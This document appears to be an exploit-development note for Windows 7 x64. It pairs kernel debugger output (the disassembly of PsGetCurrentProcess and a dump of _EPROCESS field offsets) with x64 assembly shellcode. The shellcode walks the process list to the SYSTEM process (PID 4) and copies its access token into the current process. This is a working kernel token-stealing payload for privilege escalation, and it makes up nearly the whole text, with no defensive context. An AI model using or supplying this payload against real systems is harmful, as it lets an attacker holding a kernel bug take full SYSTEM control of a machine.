Windows 7 - x64

kd> uf nt!PsGetCurrentProcess
nt!PsGetCurrentProcess:
fffff800`02884120 65488b042588010000 mov   rax,qword ptr gs:[188h]
fffff800`02884129 488b4070        mov     rax,qword ptr [rax+70h]
fffff800`0288412d c3              ret

kd> dt nt!_EPROCESS poi(nt!KiInitialThread+70)
   +0x000 Pcb              : _KPROCESS
   +0x160 ProcessLock      : _EX_PUSH_LOCK
   +0x168 CreateTime       : _LARGE_INTEGER 0x01d5094e`e0f80f70
   +0x170 ExitTime         : _LARGE_INTEGER 0x0
   +0x178 RundownProtect   : _EX_RUNDOWN_REF
   +0x180 UniqueProcessId  : 0x00000000`00000004 Void
   +0x188 ActiveProcessLinks : _LIST_ENTRY [ 0xfffffa80`04964668 - 0xfffff800`02a25440 ]
   +0x198 ProcessQuotaUsage : [2] 0
   +0x1a8 ProcessQuotaPeak : [2] 0
   +0x1b8 CommitCharge     : 0x27
   +0x1c0 QuotaBlock       : 0xfffff800`02a02940 _EPROCESS_QUOTA_BLOCK
   +0x1c8 CpuQuotaBlock    : (null) 
   +0x1d0 PeakVirtualSize  : 0xb3e000
   +0x1d8 VirtualSize      : 0x58e000
   +0x1e0 SessionProcessLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ]
   +0x1f0 DebugPort        : (null) 
   +0x1f8 ExceptionPortData : (null) 
   +0x1f8 ExceptionPortValue : 0
   +0x1f8 ExceptionPortState : 0y000
   +0x200 ObjectTable      : 0xfffff8a0`000016d0 _HANDLE_TABLE
   +0x208 Token            : _EX_FAST_REF
 

; get current process
mov rax, gs:0x188
mov rax, [rax + 0x70]

mov rbx, rax            ; rax has the pointer to the current KPROCESS

; looking for system PID
__loop:
mov rbx, [rbx + 0x188]  ; +0x188 ActiveProcessLinks : _LIST_ENTRY [ 0xfffffa80`04964668 - 0xfffff800`02a25440 ]
sub rbx, 0x188          ; next process
mov rcx, [rbx + 0x180]  ; +0x180 UniqueProcessId  : 0x00000000`00000004 Void
cmp rcx, 4              ; compare target PID
jnz __loop

; overwriting the token
mov rcx, [rbx + 0x208]  ; +0x208 Token            : _EX_FAST_REF
and cl, 0xf0            ; clear lowest nibble
mov [rax + 0x208], rcx  ; +0x208 Token            : _EX_FAST_REF
